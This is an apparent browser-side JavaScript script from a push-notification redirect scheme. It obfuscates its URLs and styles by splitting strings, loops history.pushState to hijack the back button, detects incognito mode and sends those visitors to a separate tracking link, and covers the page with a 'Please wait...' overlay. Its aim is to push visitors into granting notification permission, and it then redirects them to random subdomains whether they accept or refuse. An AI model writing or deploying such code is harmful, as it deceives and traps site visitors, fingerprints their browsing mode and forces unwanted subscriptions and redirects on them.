var $_GET = function (key) {
    var s = window.location.search;
    s = s.match(new RegExp(key + '=([^&=]+)'));
    return s ? s[1] : false;
};

function b_x(lnd_m, n_m, d_m, prs, h_b, h_3, count, u_dm, u_dk, un, uri, end, mobile) {
    var hhh = h_b.split('_');
    var hhh_2 = h_b.split('_*_');
    var hash = hhh[0];
    var r_nm_xm = function (min, max) {
        return Math.round(Math.random() * (max - min)) + min;
    };
    var next = 'h' + 'tt' + 'ps' + ':/' + '/' + r_nm_xm(1, 99) + '.' + d_m + '/?' + 'h=' + h_b + '&c' + 'nv=1' + h_3;
    if (uri) {
        next = 'ht' + 'tp' + 's:' + '//' + r_nm_xm(1, 99) + '.' + d_m + '/in' + 'de' + 'x_' + '2.ph' + 'p?h=' + h_b + '&cn' + 'v=1' + h_3 + '&u' + 'ri=' + encodeURIComponent(uri);
    }
    !function () {
        var t;
        try {
            for (t = 0; 5 > t; ++t) history.pushState({}, "", "#");
            onpopstate = function (t) {
                t.state && location.replace('ht' + 'tp' + 's:/' + '/' + location.host + location.pathname + location.search)
            }
        } catch (o) {
        }
    }();
    var fxn_nxet = function () {
        /*if ([10, 11, 12].indexOf(lnd_m) === -1) {
            document.location.href = next
        }*/
        if ((lnd_m === 13 && end) || lnd_m !== 13) {
            document.location.href = next
        }
    };
    var href = window.location.href;
    var host = window.location.host;
    var expl = host.split('.');
    if (expl.length > 2) {
        host = expl[1] + '.' + expl[2];
    }
    if (href) {
        var mobilecheck = function () {
            var check = false;
            (function (a) {
                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
            })(navigator.userAgent || navigator.vendor || window.opera);
            return check;
        };
        var mm = mobilecheck();
        var gnrtd = function () {
            !function () {
                var t;
                try {
                    for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
                    onpopstate = function (t) {
                        t.state && location.replace("#")
                    }
                } catch (o) {
                }
            }();
            //if (uri && end) {
            var img_style = 'm' + 'arg' + 'in:1' + '0% 35' + '% 0 3' + '5%;w' + 'idth' + ':30%;';
            var h2_style = 'fo' + 'nt-s' + 'ize:5' + '0px;';
            if (mm) {
                img_style = 'm' + 'arg' + 'in:30' + '% 15% 0 ' + '15%;' + 'wid' + 'th:7' + '0%;';
                h2_style = 'fo' + 'nt-' + 'siz' + 'e:8' + '0px;';
            }
            var d = document.createElement('div');
            d.setAttribute('style', 'z-i' + 'nde' + 'x:999' + '999;p' + 'osi' + 'tion' + ':fixe' + 'd;to' + 'p:0' + ';left' + ':0;w' + 'idt' + 'h:100' + '%;back' + 'grou' + 'nd:rg' + 'ba(0, 15' + '5, 255, 0.13);hei' + 'ght:10' + '0%;te' + 'xt-al' + 'ign:c' + 'enter;');
            d.innerHTML = '<img src="ht' + 'tps' + ':/' + '/' + host + '/im' + 'g_i' + '/lr' + 'd.g' + 'if" style="' + img_style + '">' +
                '<h2 style="' + h2_style + '">Ple' + 'as' + 'e wa' + 'it...</h2>';
            document.body.appendChild(d);
            //}
        };
        var hash_sub = hhh[0] + '_*_' + hhh_2[1] + '_*_' + hhh_2[2];
        var news_feed_2 = 'https://xvyvx.com/click.php?key=6l5bzkmf1mju73v1u9vx&type=incognito';
        //var news_feed_2 = 'h' + 'tt' + 'p' + '://to' + 'pn' + 'e' + 'ws.w' + 'or' + 'l' + 'd/' + '?c=' + hash_sub;
        var news_feed = 'h' + 'ttp' + 's:/' + '/' + r_nm_xm(1, 99) + '.' + host + '/i_' + '4.p' + 'hp' + '?h=' + hhh[0] + '_a946' + 'eea' + '01' + 'e5d_10' + '0_' + '*_' + 'de' + 'f_s' + 'ub_' + '*_s' + 'ub_i' + 'd_2&c' + 'nv=' + '1&s' + 't_' + '1=' + '1';
        console.log(news_feed)
        if (parseInt(hash) === 8053760137) {
            news_feed = news_feed_2;
        }
        //console.log(encodeURIComponent(hash_sub));
        var fnie = function (type) {
            if (type === 1) {
                if (!end) {
                    document.location.href = news_feed;
                } else {
                    document.location.href = uri + end;
                }
            } else if (type === 2) {
                if (!end) {
                    var emj = '';
                    /*if ($_GET('mj') && 'mf'.indexOf($_GET('mj').charAt(0)) > -1) {
                        emj = '&emj=1';
                    }*/
                    document.location.href = 'ht' + 'tp' + 's:/' + '/' + host + '/?' + 'r=' + encodeURIComponent(hash_sub) + '&b_' + 'ss=' + encodeURIComponent(prs) + emj/* + '&r_r=' + encodeURIComponent(document.referrer)*/;
                } else {
                    hash_sub = hhh[0] + '_*_' + hhh_2[1];
                    document.location.href = 'ht' + 'tp' + 's:/' + '/' + host + '/in' + 'de' + 'x_' + '2.ph' + 'p?r=' + encodeURIComponent(hash_sub) + '&u' + 'ri=' + encodeURIComponent(uri) + '&b_' + 'ss=' + encodeURIComponent(prs);
                }
            }
        };
        var chng_grtd = function () {
            gnrtd();
            setTimeout(function () {
                window.location.href = news_feed;
            }, 20000);
        };
        if (!end) {
            function dtctprvmd(cb) {
                var on = cb.bind(null, true),
                    off = cb.bind(null, false);

                function tryls() {
                    try {
                        localStorage.length ? off() : (localStorage.x = 1, localStorage.removeItem("x"), off());
                    } catch (e) {
                        navigator.cookieEnabled ? on() : off();
                    }
                }

                window.webkitRequestFileSystem ? webkitRequestFileSystem(0, 0, off, on)
                    : "MozAppearance" in document.documentElement.style ? navigator.serviceWorker ? off() : on()
                    : /constructor/i.test(window.HTMLElement) || window.safari ? tryls()
                        : !window.indexedDB && (window.PointerEvent || window.MSPointerEvent) ? on()
                            : off()
            }

            dtctprvmd(function (isPrivateMode) {
                if (isPrivateMode) {
                    window.location.href = news_feed_2;
                } else {
                    alo_bfrs();
                }
            });
        } else {
            alo_bfrs();
        }

        function alo_bfrs() {
            if (n_m === 1 || n_m === 3) {
                var mega_tok = u_dk;
                if (localStorage.getItem(mega_tok)) {
                    fnie(1);
                } else {
                    var mg = setInterval(function () {
                        if (typeof MegaPush) {
                            clearInterval(mg);
                            MegaPush.init({
                                pid: hash, type: 'auto', button: 'testbtn', granted: function () {
                                    console.log('granted');
                                    if (end) {
                                        gnrtd();
                                    } else {
                                        chng_grtd();
                                    }
                                    var rt = setInterval(function () {
                                        if (localStorage.getItem(mega_tok)) {
                                            clearInterval(rt);
                                            fnie(2);
                                        }
                                    }, 50);
                                }, denied: function () {
                                    console.log('denied');
                                    if (count === 0) {
                                        fnie(1);
                                    } else {
                                        fxn_nxet();
                                    }
                                }, subscribed: function () {
                                    //fnie(1);
                                }
                            });
                        }
                    }, 100);
                }
            } else if (n_m === 2) {
                init(un, function (status) {
                    switch (true) {
                        case status === 'granted':
                            if (end) {
                                gnrtd();
                            } else {
                                chng_grtd();
                            }
                            console.log('granted');
                            break;
                        case status === 'denied':
                            console.log('denied');
                            if (count === 0) {
                                fnie(1);
                            } else {
                                fxn_nxet();
                            }
                            break;
                        case status === 'default':
                            console.log('default');
                            if (count === 0) {
                                fnie(1);
                            } else {
                                fxn_nxet();
                            }
                            break;
                    }
                }).then(function () {
                    console.log('subscribed');
                    fnie(2);
                });
            }
        }
    }
}